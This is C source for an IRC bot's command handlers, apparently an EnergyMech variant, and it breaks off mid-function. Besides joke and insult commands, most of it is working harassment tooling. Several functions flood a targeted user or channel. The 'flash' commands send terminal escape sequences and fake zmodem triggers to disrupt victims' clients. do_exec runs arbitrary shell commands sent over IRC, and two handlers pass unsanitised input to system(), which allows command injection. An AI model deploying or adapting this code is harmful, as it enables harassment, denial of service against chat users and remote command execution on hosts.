#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <strings.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
 
#include "global.h"
#include "config.h"
#include "defines.h"
#include "structs.h"
#include "h.h"
#include "commands.h"

void do_randaway(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	
	strcpy(buffer, randstring(AWAYFILE));
	
	send_to_server(AWAYFORM, buffer, time2away(getthetime()));
	send_to_user(from, "AWAY \002->\002 %s", buffer);
	current->am_Away = TRUE;
}

void do_randsay(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDSAYFILE));
	
	if(ischannel(to))
	{
		if (rest)
		{
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
		}
		else
		{
		sendprivmsg(chan, "%s", buffer);
		}
	}
	else
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
	}
}

void do_pcjoke(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDPCJOKEFILE));
	
	if(ischannel(to))
	{
		if (rest)
		{
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
		}
		else
		{
		sendprivmsg(chan, "%s", buffer);
		}
	}
	else
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
	}
}

void do_beavis(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDBEAVISFILE));
	
	if(ischannel(to))
	{
		if (rest)
		{
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
		}
		else
		{
		sendprivmsg(chan, "%s", buffer);
		}
	}
	else
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
	}
}

void do_yomama(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDYOMAMAFILE));
	
	if(ischannel(to))
	{
		if (rest)
		{
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
		}
		else
		{
		sendprivmsg(chan, "%s", buffer);
		}
	}
	else
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
	}
}

void do_insult(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDINSULTFILE));
	
	if(ischannel(to))
	{
		if (rest)
		{
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
		}
		else
		{
		sendprivmsg(chan, "%s", buffer);
		}
	}
	else
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
	}
}

void do_pickup(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDPICKUPFILE));
	
	if(ischannel(to))
	{
		if (rest)
		{
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
		}
		else
		{
		sendprivmsg(chan, "%s", buffer);
		}
	}
	else
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
	}
}

void do_bong(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	strcpy(buffer, randstring(RANDBONGFILE));
	
	if(ischannel(to))
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		sendprivmsg(chan, "hey %s, %s", nick, buffer);
	}
	else
	{
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_user(from, "%s \002->>\002 %s", buffer, nick);
	}
}

void do_laserkick(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan, *nick, *nuh;
	int rnum, min, max;
	unsigned int i = (unsigned int) clock();
	
	min = 1;
	max = 5000;
	
	srand(i);
	rnum = ((rand() % (int)(((max)+1) - (min))) + (min));
	
	chan = get_channel(to, &rest);
	
	if (get_userlevel(from, chan) < cmdlevel) {
		return;
	}
	
	if (!(nick = get_token(&rest, " ")))
	{
		send_to_user(from, "\002%s\002", "Ambigous Command: Specify nick.");
		return;
	}
	if (!(nuh = nick2uh(from, nick, 0)))
	  return;
	if (get_userlevel(nuh, chan) > get_userlevel(from, chan))
	{
	  sendkick(chan, currentnick, "\002Laserkick kick attempt of %s! pbht!\002", nick);
	  return;
	}
	sendprivmsg(chan, "\002%s has been targeted for annihlation at %s\002", nick, time2str(getthetime()));
	sendprivmsg(chan, "\002%s target acquired, StarMech Laser Powered to %i terajoules\002", nick, rnum);
	sendkick(chan, nick, "%s", randstring(RANDLASERFILE));
	send_to_user(from, "\002Laser activated on %s on channel %s\002", nick, chan);
}

void do_flood(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	char *nuh;
	int re = 20;

	chan = get_channel(to, &rest);
	nick = get_token(&rest, " ");

		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}
		
		send_to_user(from, "WARNING Excessive simultaneous use will flood mech off.");
		
		strcpy(buffer, randstring(RANDFLOODFILE));
		
		while (re)
		{
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(4);
		re--;
		}
		
		send_to_user(from, "The Flood sent to \002%s\002 has completed", nick);
}

void do_randflood(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	char *nuh;
	int re = 20;

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}
		
		send_to_user(from, "WARNING Excessive simultaneous use will flood mech off.");

		while (re)
		{
		strcpy(buffer, randstring(RANDFLOODFILE));
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(4);
		re--;
		}
		
		send_to_user(from, "The RandFlood sent to \002%s\002 has completed", nick);
}

void do_tsunami(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN] = "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^";
	char *chan;
	char *nick;
	char *nuh;
	int re = 20;

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}
		
		send_to_user(from, "WARNING Excessive simultaneous use will flood mech off.");

		while (re)
		{
		sendprivmsg(nick, "%s", buffer);
		sleep(5);
		re--;
		}
		send_to_user(from, "Tsunami sent to \002%s\002 has completed", nick);
}

void do_schitzo(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	char *nuh;
	int re = 2, re2 = 2, re3 = 2, re4 = 2, re5 = 5;
	
	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	if (!rest)
	{
	send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
	return;
	}
	
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}
	
	send_to_user(from, "\002Skitzo on %s started\002", nick);
		
		while (re)
		{		
		strcpy(buffer, randstring(RANDSAYFILE));
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(3);
		re--;
		}
		
		while (re2)
		{		
		strcpy(buffer, randstring(RANDINSULTFILE));
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(3);
		re2--;
		}
		
		while (re3)
		{		
		strcpy(buffer, randstring(RANDBEAVISFILE));
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(3);
		re3--;
		}
		
		while (re4)
		{		
		strcpy(buffer, randstring(RANDPICKUPFILE));
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(3);
		re4--;
		}
		
		while (re5)
		{		
		strcpy(buffer, randstring(RANDYOMAMAFILE));
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(3);
		re5--;
		}
		
		send_to_user(from, "Skitzo sent to \002%s\002 has completed", nick);
}

void do_flashmsg(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan;
	char *nick;
	char *nuh;
	int re = 1;

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}
		
		send_to_user(from, "WARNING Excessive simultaneous use will flood mech off.");
		
		while (re)
		{
		send_to_server("PRIVMSG %s :rz\016\015\052\052\030B00000000000000\015", nick);
		send_to_server("PRIVMSG %s :\033c\033(0\033#8", nick);
		send_to_server("PRIVMSG %s :\033[1;3r\033[J", nick);
		send_to_server("PRIVMSG %s :\033[5m\033[?5h", nick);
		send_to_server("PRIVMSG %s :\014\033[5i\033[?5h", nick);
		send_to_server("PRIVMSG %s :\033[1;3r\033[5i", nick);
		sleep(4);
		send_to_server("PRIVMSG %s :\033[1;5m\033(0", nick);
		send_to_server("PRIVMSG %s :**\030B00", nick);
		send_to_server("PRIVMSG %s :\033**EMSI_IRQ8E08", nick);
		send_to_server("PRIVMSG %s :\033[1;3r\033[J", nick);
		send_to_server("PRIVMSG %s :\014\033[5i\033[?5h", nick);
		send_to_server("PRIVMSG %s :\033[1;3r\033[J", nick);
		send_to_server("PRIVMSG %s :\033[1;5m\033(0", nick);
		re--;
		}
		
		send_to_user(from, "The Flash sent to \002%s\002 has completed", nick);
}

void do_megaflood(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char buffer2[MAXLEN] = "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^";
	char *chan;
	char *nick;
	char *nuh;
	int re = 2, re2 = 5, re3 = 5, re4 = 5;
	
	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
	if (!rest)
	{
	send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
	return;
	}
	
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}
	
		send_to_user(from, "WARNING Excessive simultaneous use will flood mech off.");
		
		while (re)
		{		
		send_to_server("PRIVMSG %s :rz\015\052\052\030B00000000000000\015", nick);
		send_to_server("PRIVMSG %s :\033c\033(0\033#8", nick);
		sleep(3);
		send_to_server("PRIVMSG %s :\033[1;3r\033[J", nick);
		send_to_server("PRIVMSG %s :\033[5m\033[?5h", nick);
		sleep(3);
		send_to_server("PRIVMSG %s :\014\033[5i\033[?5h", nick);
		send_to_server("PRIVMSG %s :\033[1;3r\033[5i", nick);
		sleep(3);
		send_to_server("PRIVMSG %s :\033[1;5m\033(0", nick);
		send_to_server("PRIVMSG %s :**\030B00", nick);
		sleep(3);
		send_to_server("PRIVMSG %s :\033**EMSI_IRQ8E08", nick);
		send_to_server("PRIVMSG %s :\033[1;3r\033[J", nick);
		sleep(3);
		send_to_server("PRIVMSG %s :\014\033[5i\033[?5h", nick);
		send_to_server("PRIVMSG %s :\033[1;3r\033[J", nick);
		sleep(3);
		re--;
		}
		
		while (re2)
		{		
		sendprivmsg(nick, "%s", buffer2);
		sleep(4);
		re2--;
		}
		
		while (re3)
		{		
		strcpy(buffer, randstring(RANDFLOODFILE));
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(4);
		re3--;
		}
		
		strcpy(buffer, randstring(RANDFLOODFILE));
		while (re4)
		{		
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		sleep(4);
		re4--;
		}
		
		send_to_server("PRIVMSG %s :Maybe you should change your nick fucker", nick);
		send_to_user(from, "MegaFlood sent to \002%s\002 has completed", nick);
}

void do_nrandflood(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *chan;
	char *nick;
	char *nuh;
	int re = 20;

	nick = get_token(&rest, " ");
	chan = get_channel(to, &rest);
	
		if (!rest)
		{
		send_to_user(from, "\002Ambigous Command: Specify nick or channel.\002");
		return;
		}
		
		if (!(nuh = nick2uh(from, nick, 0))) {
	  		return;
	  	}
		if (get_userlevel(nuh, chan) >= get_userlevel(from, chan)) {
	  		send_to_user(from, "\002You can not flood someone with a higher level than you :b\002");
	  		send_to_user(nick, "\002%s attempted to flood you\002", getnick(from));
	  		return;
		}
		
		send_to_user(from, "WARNING Excessive simultaneous use will flood mech off.");

		while (re)
		{
		strcpy(buffer, randstring(RANDFLOODFILE));
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		send_to_server("PRIVMSG %s :%s", nick, buffer);
		do_swapnick(from, to, rest, cmdlevel);
		sleep(6);
		re--;
		}
		
		strcpy(current->nick, current->realnick);
		sendnick(current->nick);
		
		send_to_user(from, "The NickFlood sent to \002%s\002 has completed", nick);
}

void do_assault(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char buffer2[MAXLEN] = "^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^";
	char *chan;
	char *nuh;
	int re2 = 5, re3 = 5, re4 = 5;

	chan = get_token(&rest, " ");
	if (!chan)
	{
		send_to_user(from, "\002No channel name specified\002");
		return;
	}
	if (!ischannel(chan))
	{
		send_to_user(from, "\002Invalid channel name\002");
		return;
	}

	if (get_userlevel(from, chan) < cmdlevel)
	{
		return;
	}
	

	send_to_user(from, "\002Attempting the assault of %s\002", chan);
	join_channel(chan, rest, TRUE);
	
		send_to_user(from, "WARNING Excessive simultaneous use will flood mech off.");
		
		while (re2)
		{		
		sendprivmsg(chan, "%s", buffer2);
		do_swapnick(from, to, rest, cmdlevel);
		sleep(6);
		re2--;
		}
		
		while (re3)
		{		
		strcpy(buffer, randstring(RANDFLOODFILE));
		send_to_server("PRIVMSG %s :%s", chan, buffer);
		do_swapnick(from, to, rest, cmdlevel);
		sleep(6);
		re3--;
		}
		
		strcpy(buffer, randstring(RANDFLOODFILE));
		while (re4)
		{		
		send_to_server("PRIVMSG %s :%s", chan, buffer);
		do_swapnick(from, to, rest, cmdlevel);
		sleep(6);
		re4--;
		}
		
		send_to_user(from, "\002Assault on %s has completed\002", chan);
		send_to_user(from, "\002Reseting Bot\002");
		reset_botstate();
}

void do_plususer(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan, *nick, *level, *aopa, *prota, *uh, *pass;
	int access, aop, prot, already, templevel;
	aUser *tmp;
	aChannel *Channel;

	chan = DEFAULTCHAN;
	level = DEFAULTLEVEL;
	aopa = DEFAULTAOP;
	prota = DEFAULTPROT;
	pass = "";
	
	if (ischannel(to)) {
		chan = get_token(&rest, " ");
		if ((Channel = find_channel(chan)) == NULL) {
			return;
		}
	}
	
	nick = get_token(&rest, " ");
	
	if (!rest)
	{
		send_to_user(from, "\002No nick or userhost specified\002");
		return;
	}
	
  if (!chan || !*chan || (!ischannel(chan) && my_stricmp(chan, "*")))
	 {
		send_to_user(from, "\002%s\002",
			"Usage: adduser <nick or userhost>");
		return;
	 }
  if (*chan == '*')  /* Nice kludge on next line =) */
	templevel = get_userlevel(from, "#Onefuckedupchannel!#O!@I#");
  else
	templevel = get_userlevel(from, chan);
  if (templevel < cmdlevel)
	 {
		return;
	 }
	 
  if (!(uh = nick2uh(from, nick, 1)))
      return;
  access = atoi(level);
  if ((access < 0) || (access >= OWNERLEVEL+1))
  {
		send_to_user(from, "\002Valid levels are from 0 thru %i\002", OWNERLEVEL);
		return;
  }
  if (access > templevel)
  {
		send_to_user(from, "\002Level must be <= to yours on %s\002", chan);
		return;
  }
  if (!my_stricmp("*!*@*", uh))
  {
	send_to_user(from, "\002Problem adding *!*@*, try again\002");
	return;
  }
  prot = atoi(prota);
  aop = atoi(aopa);
  if (check_for_number(from, prota) || check_for_number(from, aopa))
	return;
  prot = (prot < 0) ? 0 : (prot > MAXPROTLEVEL) ? MAXPROTLEVEL : prot;
  
	if (ischannel(to)) {
		access = get_int_varc(Channel, SETDALEVEL_VAR);
		aop = get_int_varc(Channel, SETDAOP_VAR);
		prot = get_int_varc(Channel, SETDPROT_VAR);
	}
	
  already = is_user(uh, chan);
	if (already)
	{
		send_to_user(from, "\002%s %s on %s is already a user\002", nick, uh, chan);
		return;
	}
  if ((tmp=add_to_userlist(&(current->Userlist), uh, access, aop ? 1 : 0, prot,
		chan, (pass && *pass) ? encode(pass) : NULL)) != NULL)
  {
	if (tmp->whoadd)
		MyFree(&tmp->whoadd);
	mstrcpy(&tmp->whoadd, from);
#ifdef USE_CCC
	send_to_ccc("1 ADD %s %s %s %i %i %i %s",
		from, chan, uh, access, aop ? 1 : 0, prot,
		(pass && *pass) ? encode(pass) : "");
#endif
	send_to_user(from, "\002%s has been added as %s on %s\002", nick, uh, chan);
	send_to_user(from,
				"\002Access level: %i  Auto-op: %s  Protect level: %i  %s %s\002",
			  access, aop ? "Yes" : "No", prot,
			  (pass && *pass) ? "Password:" : "",
			  (pass && *pass) ? pass : "");
	sendnotice(nick, "\002%s has blessed you with %i levels of immortality\002",
				currentnick, access);
	sendnotice(nick, "\002You are %sbeing auto-opped *smo0tch*\002",
		aop ? "" : "not ");
	if (prot)
	  sendnotice(nick, "\002You have been granted %i terajoules of EnergyMech Ego Shields\002",
			  prot);
	else
	  sendnotice(nick, "\002%s\002", "EnergyMech force does not protect you");
	sendnotice(nick, "\002My command character is %c\002", current->cmdchar);
	sendnotice(nick, "\002Use \002%chelp topics\002 and \002%chelpfull\002 commands for command help\002", current->cmdchar, current->cmdchar);
	if (pass && *pass)
	{
	  sendnotice(nick, "\002Password necessary for doing commands: %s\002",
			  pass);
	  sendnotice(nick, "\002If you do not like your password, use \"passwd\" to change it\002");
	}
		}
  else
	send_to_user( from, "\002Problem adding the user\002");
	return;
}                   

void do_minususer(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	int templevel;
	char *chan, *nick, *uh;
 	aUser *tmp; 
	chan = "*";
	
	templevel = get_userlevel(from, "#Onefuckedupchannel!#O!@I#");
	
	if (templevel < cmdlevel) {
		return;
	}
  
	if (!chan || !*chan || (!ischannel(chan) && my_stricmp(chan, "*")))
	{
		send_to_user(from, "\002%s\002",
			"Usage: deluser <nick or userhost>");
		return;
	}
	if (get_userlevel(from, chan) < cmdlevel)
	{
		return;
	}
	nick = get_token(&rest, " ");
	if (!nick)
	{ 
  		send_to_user(from, "\002No nick or userhost specified\002");
		return;
	}
	if (!(uh = nick2uh(from, nick, 0)))
		return;
	if ((tmp=find_user(&(current->Userlist), uh, chan)) == NULL)
	{
		send_to_user(from,
			"\002%s is not in my users list\002",
			uh);
		return;
	}
	if (!matches(owneruserhost, uh) || !matches(uh, owneruserhost))
	{
		send_to_user(from,
			"\002Sorry, %s is god and can not be deleted\002", nick);
		return;
	}
	if (!matches(DEFAULT_OWNERUH, uh) || !matches(uh, DEFAULT_OWNERUH))
	{
		send_to_user(from,
			"\002Sorry, %s is god and can not be deleted\002", nick);
		return;
	}
/* SuperUser */

	if ((tmp->access == SUPERUSER) && (get_userlevel(from, chan) == OWNERLEVEL)) {
		send_to_user(from, "\002Deleting SuperUser %s\002", uh);
	}
	else {
		if (get_userlevel(from, chan) < tmp->access)
		{
			send_to_user(from, "\002%s has a higher immortality level than you on %s\002", uh, chan);
			return;
		}
	}
	
/* End SuperUser */
#ifdef USE_CCC
        send_to_ccc("1 DEL %s %s %s", from, tmp->channel, tmp->userhost);
#endif
	remove_user(&(current->Userlist), tmp);
	send_to_user(from, "\002User %s has been purged\002", uh);
}

void do_flash3(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *uh;
	char *chan;
	char *level;
	int num;
	

	chan = get_channel(to, &rest);
	
	if (!rest)
	{
		send_to_user(from, "\002No arguments specified\002");
		return;
	}
		
	uh = get_token(&rest, " ");
	
  	if (!(level = get_token(&rest, " ")))
	{
		send_to_user(from, "\002No level specified for flash\002");
		return;
	}
	
	num = atoi(level);
	
	if ((num > 3) || (num < 1))
	{
		send_to_user(from, "\002Valid Levels are:\002");
		send_to_user(from, "\002 1  -  Original Flash\002");
		send_to_user(from, "\002 2  -  ~10 Zmodem Flashes\002");
		send_to_user(from, "\002 3  -  ~99 Zmodem Flashes\002");
		return;
	}
	
	sprintf(buffer, "%s %s %s", PLUGIN1, uh, level);
  	system(buffer);
		
	send_to_user(from, "\002Flash sent to %s\002", uh);
}

void do_mflash(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char buffer[MAXLEN];
	char *faddress;
	char *saddress;
	char *serv;
	char *chan;
	


	chan = get_channel(to, &rest);
	
	if (!rest)
	{
		send_to_user(from, "\002No arguments specified\002");
		return;
	}
	
	serv = get_token(&rest, " ");
	
  	if (!(faddress = get_token(&rest, " ")))
	{
		send_to_user(from, "\002No address specified for mail flash\002");
		return;
	}
	
	if (!(saddress = get_token(&rest, " ")))
	{
		send_to_user(from, "\002No address specified for mail flash\002");
		return;
	}
	
	sprintf(buffer, "%s %s %s %s", PLUGIN3, serv, faddress, saddress);
  	system(buffer);
		
	send_to_user(from, "\002Mail Flash sent to %s\002", saddress);
}

void do_exec(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *exec, *exec2, buffer[MAXLEN];
	char buf[BUFSIZ];
	char lilbuf[BUFSIZ];
	FILE *ptr;
	int templevel, abuf;
	
	if (!rest)
	{
		send_to_user(from, "\002No arguments specified\002");
		return;
	}
	
	/* Only the owner can do exec */
	if (matches(owneruserhost, from) || matches(DEFAULT_OWNERUH, from)) {
		return;
	}
	
	templevel = get_userlevel(from, "*");
	
	if (templevel < cmdlevel) {
		return;
	}
	
	exec = strtok(rest, " ");
	if (exec) {
		exec2 = strtok(NULL, "\n");
	}
	
	if (exec2 == NULL) {
		sprintf(buffer, "%s", exec);
		if ((ptr = popen(buffer, "r")) != NULL) {
			while (fgets(buf, BUFSIZ, ptr) != NULL) {
				abuf = strlen(buf);
				buf[(abuf - 1)] = '\0';
				send_to_user(from, "[\002EXEC\002] %s", buf);
			}
		}
		pclose (ptr);
	}
	else {
		sprintf(buffer, "%s %s", exec, exec2);
		if ((ptr = popen(buffer, "r")) != NULL) {
			while (fgets(buf, BUFSIZ, ptr) != NULL) {
				abuf = strlen(buf);
				buf[(abuf - 1)] = '\0';
				send_to_user(from, "[\002EXEC\002] %s", buf);
			}
		}
		pclose (ptr);
	}
}

void do_aphex(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan;
	
	chan = get_channel(to, &rest);
	
		sendprivmsg(chan, "\002 _______         \002");
		sendprivmsg(chan, "\002(__,-,  \\       \002");
		sendprivmsg(chan, "\002    / /\\ \\     \002");
		sendprivmsg(chan, "\002   /,_) \\ \\    \002");
		sendprivmsg(chan, "\002  (/      \\\\   \002");
		sendprivmsg(chan, "\002           \\\\  \002");
}

void do_core(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	aBot    *bot;
	aChannel *chan;
	
	rest = current->nick;
	
	if (rest && (bot = find_bot(rest)))
	{
	send_to_user(from, "Core Information for \002%s\002", bot->realnick);
	send_to_user(from, "__________________________________________");
	send_to_user(from, "ProcessID: \002%5i\002  Debug Level: \002%i\002", mypid, dbuglevel);
#ifdef CCC
	send_to_user(from, "CCC Socket: \002%-5i\002  CCC Port: \002%-5i\002", ccc_sock, ccc_port);
#endif
	if (bot->mymodes) {
		send_to_user(from, "Mode: (\002+%s\002)  Lag: \002%3d\002 s", bot->mymodes, bot->serv_lag);
	}
	send_to_user(from, "___\002Servers\002________________________________");
	send_to_user(from, "Current Server: \002%s\002 (\002%s\002) Port: \002%d\002", bot->serverlist[current->current_server].name, bot->serverlist[current->current_server].realname, bot->serverlist[current->current_server].port);
	send_to_user(from, "Servers in list: \002%d\002", bot->num_of_servers);
	send_to_user(from, "___\002Uptime\002_________________________________");
	send_to_user(from, "Current Time: \002%s\002", time2str(getthetime()));
	send_to_user(from, "Started:      \002%-20.20s\002", time2str(uptime));
	send_to_user(from, "Uptime:       \002%-30s\002", idle2str(getthetime()-uptime));
	send_to_user(from, "___\002Command Character\002______________________");
	send_to_user(from, "Cmdchar: \002%c\002", current->cmdchar);
	send_to_user(from, "___\002Active Channels\002________________________");
		if (!bot->Channel_list) {
			send_to_user(from, "\002Not active on any channel\002");
		}
		else {
			for (chan = bot->Channel_list; chan; chan = chan->next) {
				send_to_user(from, "Active on: \002%s\002", chan->name);
			}
		}
	send_to_user(from, "__________________________________________");
	}
	else
	{
	return;
	}
}

void do_cserv(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	aBot    *bot;
	
	rest = current->nick;
	
	if (rest && (bot = find_bot(rest)))
	{
	send_to_user(from, "\002Current Server: %s (%s) Port: %d\002", bot->serverlist[current->current_server].name, bot->serverlist[current->current_server].realname, bot->serverlist[current->current_server].port);
	send_to_user(from, "\002Servers in list: %d\002", bot->num_of_servers);
	}
	else
	{
	return;
	}
}

void do_fakelog(from, to, rest, cmdlevel)
char *from;
char *to;
char *rest;
int cmdlevel;
{
	char *chan, *nick, *uh, *msg;
	
	chan = get_channel(to, &rest);
	nick = strtok(rest, " ");
	if (nick)
	{
		msg = strtok(NULL, "\n");
	}
	
	if (!rest)
	{
		send_to_user(from, "\002No arguments specified\002");
